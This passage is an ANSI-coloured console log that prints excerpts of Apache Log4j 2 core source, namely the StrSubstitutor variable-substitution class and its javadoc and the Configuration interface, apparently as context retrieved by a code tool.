[2;36m                    [0m         [1;36m78[0m[39m: * <[0m[35m/[0m[95mpre[0m[39m>[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m: * Here only the variable's name referred to in the text should be replaced [0m     [2m                [0m
[2;36m                    [0m         [39mresulting[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m: * in the text [0m[1;39m([0m[39massuming that the value of the <code>name<[0m[35m/[0m[95mcode[0m[39m> variable is [0m    [2m                [0m
[2;36m                    [0m         [39m<code>x<[0m[35m/[0m[95mcode[0m[39m>[0m[1;39m)[0m[39m:[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m: * <pre>[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m: *   The variable $[0m[1;39m{[0m[39mx[0m[1;39m}[0m[39m must be used.[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m: * <[0m[35m/[0m[95mpre[0m[39m>[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m: * To achieve this effect there are two possibilities: Either set a different [0m   [2m                [0m
[2;36m                    [0m         [39mprefix[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m: * and suffix for variables which do not conflict with the result text you want [0m [2m                [0m
[2;36m                    [0m         [39mto[0m                                                                                  [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m: * produce. The other possibility is to use the escape character, by default [0m    [2m                [0m
[2;36m                    [0m         [32m'$'[0m[39m.[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m: * If this character is placed before a variable reference, this reference is [0m   [2m                [0m
[2;36m                    [0m         [39mignored[0m                                                                             [2m                [0m
[2;36m                    [0m         [1;36m88[0m[39m: * and won't be replaced. For example:[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m89[0m[39m: * <pre>[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m90[0m[39m: *   The variable $$[0m[1;39m{[0m[39m$[0m[1;39m{[0m[39mname[0m[1;39m}[0m[1;39m}[0m[39m must be used.[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m91[0m[39m: * <[0m[35m/[0m[95mpre[0m[39m>[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m92[0m[39m: * <p>[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m93[0m[39m: * In some complex scenarios you might even want to perform substitution in the[0m  [2m                [0m
[2;36m                    [0m         [1;36m94[0m[39m: * names of variables, for instance[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m95[0m[39m: * <pre>[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m96[0m[39m: * $[0m[1;39m{[0m[39mjre-$[0m[1;39m{[0m[39mjava.specification.version[0m[1;39m}[0m[1;39m}[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m97[0m[39m: * <[0m[35m/[0m[95mpre[0m[39m>[0m                                                                        [2m                [0m
[2;36m                    [0m         [1;36m98[0m[39m: * <code>StrSubstitutor<[0m[35m/[0m[95mcode[0m[39m> supports this recursive substitution in variable[0m  [2m                [0m
[2;36m                    [0m         [1;36m99[0m[39m: * names, but it has to be enabled explicitly by setting the[0m                     [2m                [0m
[2;36m                    [0m         [1;36m100[0m[39m: * [0m[1;39m{[0m[39m@link #[0m[1;35msetEnableSubstitutionInVariables[0m[1;39m([0m[39mboolean[0m[1;39m)[0m[39m [0m                           [2m                [0m
[2;36m                    [0m         [39menableSubstitutionInVariables[0m[1;39m}[0m                                                      [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/StrSubstitutor.jav[0m[1;92ma:200[0m[39m-[0m[1;36m280[0m [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m200[0m[39m:     * @param suffix  the suffix for variables, not null[0m                        [2m                [0m
[2;36m                    [0m         [1;36m201[0m[39m:     * @param escape  the escape character[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m202[0m[39m:     * @throws IllegalArgumentException if the prefix or suffix is null[0m         [2m                [0m
[2;36m                    [0m         [1;36m203[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m204[0m[39m:    public [0m[1;35mStrSubstitutor[0m[1;39m([0m[39mfinal StrLookup variableResolver, final String [0m       [2m                [0m
[2;36m                    [0m         [39mprefix, final String suffix,[0m                                                        [2m                [0m
[2;36m                    [0m         [1;36m205[0m[39m:                          final char escape[0m[1;39m)[0m[39m [0m[1;39m{[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m206[0m[39m:        [0m[1;35mthis.setVariableResolver[0m[1;39m([0m[39mvariableResolver[0m[1;39m)[0m[39m;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m207[0m[39m:        [0m[1;35mthis.setVariablePrefix[0m[1;39m([0m[39mprefix[0m[1;39m)[0m[39m;[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m208[0m[39m:        [0m[1;35mthis.setVariableSuffix[0m[1;39m([0m[39msuffix[0m[1;39m)[0m[39m;[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m209[0m[39m:        [0m[1;35mthis.setEscapeChar[0m[1;39m([0m[39mescape[0m[1;39m)[0m[39m;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m210[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m211[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m212[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m213[0m[39m:     * Creates a new instance and initializes it.[0m                               [2m                [0m
[2;36m                    [0m         [1;36m214[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m215[0m[39m:     * @param variableResolver  the variable resolver, may be null[0m              [2m                [0m
[2;36m                    [0m         [1;36m216[0m[39m:     * @param prefixMatcher  the prefix for variables, not null[0m                 [2m                [0m
[2;36m                    [0m         [1;36m217[0m[39m:     * @param suffixMatcher  the suffix for variables, not null[0m                 [2m                [0m
[2;36m                    [0m         [1;36m218[0m[39m:     * @param escape  the escape character[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m219[0m[39m:     * @throws IllegalArgumentException if the prefix or suffix is null[0m         [2m                [0m
[2;36m                    [0m         [1;36m220[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m221[0m[39m:    public [0m[1;35mStrSubstitutor[0m[1;39m([0m[39mfinal StrLookup variableResolver, final StrMatcher [0m   [2m                [0m
[2;36m                    [0m         [39mprefixMatcher,[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m222[0m[39m:                          final StrMatcher suffixMatcher,[0m                       [2m                [0m
[2;36m                    [0m         [1;36m223[0m[39m:                          final char escape[0m[1;39m)[0m[39m [0m[1;39m{[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m224[0m[39m:        [0m[1;35mthis.setVariableResolver[0m[1;39m([0m[39mvariableResolver[0m[1;39m)[0m[39m;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m225[0m[39m:        [0m[1;35mthis.setVariablePrefixMatcher[0m[1;39m([0m[39mprefixMatcher[0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m226[0m[39m:        [0m[1;35mthis.setVariableSuffixMatcher[0m[1;39m([0m[39msuffixMatcher[0m[1;39m)[0m[39m;[0m                           [2m                [0m
[2;36m                    [0m         [1;36m227[0m[39m:        [0m[1;35mthis.setEscapeChar[0m[1;39m([0m[39mescape[0m[1;39m)[0m[39m;[0m                                             [2m                [0m
[2;36m                    [0m         [1;36m228[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m229[0m[39m:    [0m[35m/[0m[35m/[0m[95m-----------------------------------------------------------------------[0m   [2m                [0m
[2;36m                    [0m         [1;36m230[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m231[0m[39m:     * Replaces all the occurrences of variables in the given source object [0m    [2m                [0m
[2;36m                    [0m         [39mwith[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m232[0m[39m:     * their matching values from the map.[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m233[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m234[0m[39m:     * @param source  the source text containing the variables to substitute, [0m  [2m                [0m
[2;36m                    [0m         [39mnull returns null[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m235[0m[39m:     * @param valueMap  the map with the values, may be null[0m                    [2m                [0m
[2;36m                    [0m         [1;36m236[0m[39m:     * @return the result of the replace operation[0m                              [2m                [0m
[2;36m                    [0m         [1;36m237[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m238[0m[39m:    public static String [0m[1;35mreplace[0m[1;39m([0m[39mfinal Object source, final Map<String, String>[0m [2m                [0m
[2;36m                    [0m         [39mvalueMap[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m239[0m[39m:        return new [0m[1;35mStrSubstitutor[0m[1;39m([0m[39mvalueMap[0m[1;39m)[0m[1;35m.replace[0m[1;39m([0m[39msource[0m[1;39m)[0m[39m;[0m                    [2m                [0m
[2;36m                    [0m         [1;36m240[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m241[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m242[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m243[0m[39m:     * Replaces all the occurrences of variables in the given source object [0m    [2m                [0m
[2;36m                    [0m         [39mwith[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m244[0m[39m:     * their matching values from the map. This method allows to specify a[0m      [2m                [0m
[2;36m                    [0m         [1;36m245[0m[39m:     * custom variable prefix and suffix[0m                                        [2m                [0m
[2;36m                    [0m         [1;36m246[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m247[0m[39m:     * @param source  the source text containing the variables to substitute, [0m  [2m                [0m
[2;36m                    [0m         [39mnull returns null[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m248[0m[39m:     * @param valueMap  the map with the values, may be null[0m                    [2m                [0m
[2;36m                    [0m         [1;36m249[0m[39m:     * @param prefix  the prefix of variables, not null[0m                         [2m                [0m
[2;36m                    [0m         [1;36m250[0m[39m:     * @param suffix  the suffix of variables, not null[0m                         [2m                [0m
[2;36m                    [0m         [1;36m251[0m[39m:     * @return the result of the replace operation[0m                              [2m                [0m
[2;36m                    [0m         [1;36m252[0m[39m:     * @throws IllegalArgumentException if the prefix or suffix is null[0m         [2m                [0m
[2;36m                    [0m         [1;36m253[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m254[0m[39m:    public static String [0m[1;35mreplace[0m[1;39m([0m[39mfinal Object source, final Map<String, String>[0m [2m                [0m
[2;36m                    [0m         [39mvalueMap, final String prefix,[0m                                                      [2m                [0m
[2;36m                    [0m         [1;36m255[0m[39m:                                 final String suffix[0m[1;39m)[0m[39m [0m[1;39m{[0m                         [2m                [0m
[2;36m                    [0m         [1;36m256[0m[39m:        return new [0m[1;35mStrSubstitutor[0m[1;39m([0m[39mvalueMap, prefix, suffix[0m[1;39m)[0m[1;35m.replace[0m[1;39m([0m[39msource[0m[1;39m)[0m[39m;[0m    [2m                [0m
[2;36m                    [0m         [1;36m257[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m258[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m259[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m260[0m[39m:     * Replaces all the occurrences of variables in the given source object [0m    [2m                [0m
[2;36m                    [0m         [39mwith their matching[0m                                                                 [2m                [0m
[2;36m                    [0m         [1;36m261[0m[39m:     * values from the properties.[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m262[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m263[0m[39m:     * @param source the source text containing the variables to substitute, [0m   [2m                [0m
[2;36m                    [0m         [39mnull returns null[0m                                                                   [2m                [0m
[2;36m                    [0m         [1;36m264[0m[39m:     * @param valueProperties the properties with values, may be null[0m           [2m                [0m
[2;36m                    [0m         [1;36m265[0m[39m:     * @return the result of the replace operation[0m                              [2m                [0m
[2;36m                    [0m         [1;36m266[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m267[0m[39m:    public static String [0m[1;35mreplace[0m[1;39m([0m[39mfinal Object source, final Properties [0m         [2m                [0m
[2;36m                    [0m         [39mvalueProperties[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                                  [2m                [0m
[2;36m                    [0m         [1;36m268[0m[39m:        if [0m[1;39m([0m[39mvalueProperties == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                          [2m                [0m
[2;36m                    [0m         [1;36m269[0m[39m:            return [0m[1;35msource.toString[0m[1;39m([0m[1;39m)[0m[39m;[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m270[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m271[0m[39m:        final Map<String, String> valueMap = new HashMap<String, String>[0m[1;39m([0m[1;39m)[0m[39m;[0m     [2m                [0m
[2;36m                    [0m         [1;36m272[0m[39m:        final Enumeration<?> propNames = [0m[1;35mvalueProperties.propertyNames[0m[1;39m([0m[1;39m)[0m[39m;[0m       [2m                [0m
[2;36m                    [0m         [1;36m273[0m[39m:        while [0m[1;39m([0m[1;35mpropNames.hasMoreElements[0m[1;39m([0m[1;39m)[0m[1;39m)[0m[39m [0m[1;39m{[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m274[0m[39m:            final String propName = [0m[1;39m([0m[39mString[0m[1;39m)[0m[39m [0m[1;35mpropNames.nextElement[0m[1;39m([0m[1;39m)[0m[39m;[0m           [2m                [0m
[2;36m                    [0m         [1;36m275[0m[39m:            final String propValue = [0m[1;35mvalueProperties.getProperty[0m[1;39m([0m[39mpropName[0m[1;39m)[0m[39m;[0m     [2m                [0m
[2;36m                    [0m         [1;36m276[0m[39m:            [0m[1;35mvalueMap.put[0m[1;39m([0m[39mpropName, propValue[0m[1;39m)[0m[39m;[0m                                  [2m                [0m
[2;36m                    [0m         [1;36m277[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m278[0m[39m:        return [0m[1;35mStrSubstitutor.replace[0m[1;39m([0m[39msource, valueMap[0m[1;39m)[0m[39m;[0m                        [2m                [0m
[2;36m                    [0m         [1;36m279[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m280[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/config/Configuration.jav[0m[1;92ma:1[0m[39m-[0m[1;36m90[0m     [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m1[0m[39m:[0m[35m/[0m[39m*[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m2[0m[39m: * Licensed to the Apache Software Foundation [0m[1;39m([0m[39mASF[0m[1;39m)[0m[39m under one or more[0m             [2m                [0m
[2;36m                    [0m         [1;36m3[0m[39m: * contributor license agreements. See the NOTICE file distributed with[0m           [2m                [0m
[2;36m                    [0m         [1;36m4[0m[39m: * this work for additional information regarding copyright ownership.[0m            [2m                [0m
[2;36m                    [0m         [1;36m5[0m[39m: * The ASF licenses this file to You under the Apache license, Version [0m[1;36m2.0[0m        [2m                [0m
[2;36m                    [0m         [1;36m6[0m[39m: * [0m[1;39m([0m[39mthe [0m[32m"License"[0m[1;39m)[0m[39m; you may not use this file except in compliance with[0m           [2m                [0m
[2;36m                    [0m         [1;36m7[0m[39m: * the License. You may obtain a copy of the License at[0m                           [2m                [0m
[2;36m                    [0m         [1;36m8[0m[39m: *[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m9[0m[39m: *      [0m[4;94mhttp://www.apache.org/licenses/LICENSE-2.0[0m                                [2m                [0m
[2;36m                    [0m         [1;36m10[0m[39m: *[0m                                                                               [2m                [0m
[2;36m                    [0m         [1;36m11[0m[39m: * Unless required by applicable law or agreed to in writing, software[0m           [2m                [0m
[2;36m                    [0m         [1;36m12[0m[39m: * distributed under the License is distributed on an [0m[32m"AS IS"[0m[39m BASIS,[0m             [2m                [0m
[2;36m                    [0m         [1;36m13[0m[39m: * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.[0m      [2m                [0m
[2;36m                    [0m         [1;36m14[0m[39m: * See the license for the specific language governing permissions and[0m           [2m                [0m
[2;36m                    [0m         [1;36m15[0m[39m: * limitations under the license.[0m                                                [2m                [0m
[2;36m                    [0m         [1;36m16[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m17[0m[39m:package org.apache.logging.log4j.core.config;[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m18[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m19[0m[39m:import java.util.Map;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m20[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m21[0m[39m:import org.apache.logging.log4j.core.Appender;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m22[0m[39m:import org.apache.logging.log4j.core.Filter;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m23[0m[39m:import org.apache.logging.log4j.core.LogEvent;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m24[0m[39m:import org.apache.logging.log4j.core.Logger;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m25[0m[39m:import org.apache.logging.log4j.core.filter.Filterable;[0m                          [2m                [0m
[2;36m                    [0m         [1;36m26[0m[39m:import org.apache.logging.log4j.core.lookup.StrSubstitutor;[0m                      [2m                [0m
[2;36m                    [0m         [1;36m27[0m[39m:import org.apache.logging.log4j.core.net.Advertiser;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m28[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m29[0m[39m:[0m[35m/[0m[39m**[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m30[0m[39m: * Interface that must be implemented to create a configuration.[0m                 [2m                [0m
[2;36m                    [0m         [1;36m31[0m[39m: *[0m[35m/[0m                                                                              [2m                [0m
[2;36m                    [0m         [1;36m32[0m[39m:public interface Configuration extends Filterable [0m[1;39m{[0m                              [2m                [0m
[2;36m                    [0m         [1;36m33[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m34[0m[39m:    [0m[35m/[0m[39m** Key for storing the Context properties. *[0m[35m/[0m                               [2m                [0m
[2;36m                    [0m         [1;36m35[0m[39m:    String CONTEXT_PROPERTIES = [0m[32m"ContextProperties"[0m[39m;[0m                             [2m                [0m
[2;36m                    [0m         [1;36m36[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m37[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m38[0m[39m:     * Returns the configuration name.[0m                                           [2m                [0m
[2;36m                    [0m         [1;36m39[0m[39m:     * @return the name of the configuration.[0m                                    [2m                [0m
[2;36m                    [0m         [1;36m40[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m41[0m[39m:    String [0m[1;35mgetName[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m42[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m43[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m44[0m[39m:     * Locates the appropriate LoggerConfig for a Logger name. This will remove [0m [2m                [0m
[2;36m                    [0m         [39mtokens from the[0m                                                                     [2m                [0m
[2;36m                    [0m         [1;36m45[0m[39m:     * package name as necessary or return the root LoggerConfig if no other [0m    [2m                [0m
[2;36m                    [0m         [39mmatches were found.[0m                                                                 [2m                [0m
[2;36m                    [0m         [1;36m46[0m[39m:     * @param name The Logger name.[0m                                              [2m                [0m
[2;36m                    [0m         [1;36m47[0m[39m:     * @return The located LoggerConfig.[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m48[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m49[0m[39m:    LoggerConfig [0m[1;35mgetLoggerConfig[0m[1;39m([0m[39mString name[0m[1;39m)[0m[39m;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m50[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m51[0m[39m:    [0m[35m/[0m[39m**[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m52[0m[39m:     * Returns a Map containing all the Appenders and their name.[0m                [2m                [0m
[2;36m                    [0m         [1;36m53[0m[39m:     * @return A Map containing each Appender's name and the Appender object.[0m    [2m                [0m
[2;36m                    [0m         [1;36m54[0m[39m:     *[0m[35m/[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m55[0m[39m:    Map<String, Appender<?>> [0m[1;35mgetAppenders[0m[1;39m([0m[1;39m)[0m[39m;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m56[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m57[0m[39m:    Map<String, LoggerConfig> [0m[1;35mgetLoggers[0m[1;39m([0m[1;39m)[0m[39m;[0m                                      [2m                [0m
[2;36m                    [0m         [1;36m58[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m59[0m[39m:    void [0m[1;35maddLoggerAppender[0m[1;39m([0m[39mLogger logger, Appender<?> appender[0m[1;39m)[0m[39m;[0m                 [2m                [0m
[2;36m                    [0m         [1;36m60[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m61[0m[39m:    void [0m[1;35maddLoggerFilter[0m[1;39m([0m[39mLogger logger, Filter filter[0m[1;39m)[0m[39m;[0m                          [2m                [0m
[2;36m                    [0m         [1;36m62[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m63[0m[39m:    void [0m[1;35msetLoggerAdditive[0m[1;39m([0m[39mLogger logger, boolean additive[0m[1;39m)[0m[39m;[0m                     [2m                [0m
[2;36m                    [0m         [1;36m64[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m65[0m[39m:    Map<String, String> [0m[1;35mgetProperties[0m[1;39m([0m[1;39m)[0m[39m;[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m66[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m67[0m[39m:    void [0m[1;35mstart[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                                [2m                [0m
[2;36m                    [0m         [1;36m68[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m69[0m[39m:    void [0m[1;35mstop[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                                 [2m                [0m
[2;36m                    [0m         [1;36m70[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m71[0m[39m:    void [0m[1;35maddListener[0m[1;39m([0m[39mConfigurationListener listener[0m[1;39m)[0m[39m;[0m                            [2m                [0m
[2;36m                    [0m         [1;36m72[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m73[0m[39m:    void [0m[1;35mremoveListener[0m[1;39m([0m[39mConfigurationListener listener[0m[1;39m)[0m[39m;[0m                         [2m                [0m
[2;36m                    [0m         [1;36m74[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m75[0m[39m:    StrSubstitutor [0m[1;35mgetSubst[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                   [2m                [0m
[2;36m                    [0m         [1;36m76[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m77[0m[39m:    void [0m[1;35mcreateConfiguration[0m[1;39m([0m[39mNode node, LogEvent event[0m[1;39m)[0m[39m;[0m                         [2m                [0m
[2;36m                    [0m         [1;36m78[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m79[0m[39m:    Object [0m[1;35mgetComponent[0m[1;39m([0m[39mString name[0m[1;39m)[0m[39m;[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m80[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m81[0m[39m:    void [0m[1;35maddComponent[0m[1;39m([0m[39mString name, Object object[0m[1;39m)[0m[39m;[0m                               [2m                [0m
[2;36m                    [0m         [1;36m82[0m[39m:[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m83[0m[39m:    void [0m[1;35msetConfigurationMonitor[0m[1;39m([0m[39mConfigurationMonitor monitor[0m[1;39m)[0m[39m;[0m                  [2m                [0m
[2;36m                    [0m         [1;36m84[0m[39m:    [0m                                                                             [2m                [0m
[2;36m                    [0m         [1;36m85[0m[39m:    ConfigurationMonitor [0m[1;35mgetConfigurationMonitor[0m[1;39m([0m[1;39m)[0m[39m;[0m                              [2m                [0m
[2;36m                    [0m         [1;36m86[0m[39m:    [0m                                                                             [2m                [0m
[2;36m                    [0m         [1;36m87[0m[39m:    void [0m[1;35msetAdvertiser[0m[1;39m([0m[39mAdvertiser advertiser[0m[1;39m)[0m[39m;[0m                                   [2m                [0m
[2;36m                    [0m         [1;36m88[0m[39m:    [0m                                                                             [2m                [0m
[2;36m                    [0m         [1;36m89[0m[39m:    Advertiser [0m[1;35mgetAdvertiser[0m[1;39m([0m[1;39m)[0m[39m;[0m                                                  [2m                [0m
[2;36m                    [0m         [1;36m90[0m[39m:[0m[1;39m}[0m                                                                                [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [39m<[0m[35m/[0m[95mcode[0m[39m>[0m                                                                             [2m                [0m
[2;36m                    [0m         [39m<code>[0m                                                                              [2m                [0m
[2;36m                    [0m         [39mcore/src/main/java/org/apache/logging/log4j/core/lookup/StrSubstitutor.jav[0m[1;92ma:950[0m[39m-[0m[1;36m105[0m [2m                [0m
[2;36m                    [0m         [1;36m0[0m                                                                                   [2m                [0m
[2;36m                    [0m         [39m```[0m                                                                                 [2m                [0m
[2;36m                    [0m         [1;36m950[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m951[0m[39m:     * @param prefixMatcher  the prefix matcher to use, null ignored[0m            [2m                [0m
[2;36m                    [0m         [1;36m952[0m[39m:     * @return this, to enable chaining[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m953[0m[39m:     * @throws IllegalArgumentException if the prefix matcher is null[0m           [2m                [0m
[2;36m                    [0m         [1;36m954[0m[39m:     *[0m[35m/[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m955[0m[39m:    public StrSubstitutor [0m[1;35msetVariablePrefixMatcher[0m[1;39m([0m[39mfinal StrMatcher [0m            [2m                [0m
[2;36m                    [0m         [39mprefixMatcher[0m[1;39m)[0m[39m [0m[1;39m{[0m                                                                    [2m                [0m
[2;36m                    [0m         [1;36m956[0m[39m:        if [0m[1;39m([0m[39mprefixMatcher == null[0m[1;39m)[0m[39m [0m[1;39m{[0m                                            [2m                [0m
[2;36m                    [0m         [1;36m957[0m[39m:            throw new [0m[1;35mIllegalArgumentException[0m[1;39m([0m[32m"Variable prefix matcher must [0m   [2m                [0m
[2;36m                    [0m         [32mnot be null!"[0m[1;39m)[0m[39m;[0m                                                                     [2m                [0m
[2;36m                    [0m         [1;36m958[0m[39m:        [0m[1;39m}[0m                                                                       [2m                [0m
[2;36m                    [0m         [1;36m959[0m[39m:        this.prefixMatcher = prefixMatcher;[0m                                     [2m                [0m
[2;36m                    [0m         [1;36m960[0m[39m:        return this;[0m                                                            [2m                [0m
[2;36m                    [0m         [1;36m961[0m[39m:    [0m[1;39m}[0m                                                                           [2m                [0m
[2;36m                    [0m         [1;36m962[0m[39m:[0m                                                                                [2m                [0m
[2;36m                    [0m         [1;36m963[0m[39m:    [0m[35m/[0m[39m**[0m                                                                         [2m                [0m
[2;36m                    [0m         [1;36m964[0m[39m:     * Sets the variable prefix to use.[0m                                         [2m                [0m
[2;36m                    [0m         [1;36m965[0m[39m:     * <p>[0m                                                                      [2m                [0m
[2;36m                    [0m         [1;36m966[0m[39m:     * The variable prefix is the character or characters that identify the[0m     [2m                [0m
[2;36m                    [0m         [1;36m967[0m[39m:     * start of a variable. This method allows a single character prefix to[0m     [2m                [0m
[2;36m                    [0m         [1;36m968[0m[39m:     * be easily set.[0m                                                           [2m                [0m
[2;36m                    [0m         [1;36m969[0m[39m:     *[0m                                                                          [2m                [0m
[2;36m                    [0m         [1;36m970[0m[39m:     * @param prefix  the prefix character to use[0m                               [2m                [0m
[2;36m                    [0m         [1;36m971[0m[39m:     * @return this, to enable chaining[0m                                         [2m                [0m
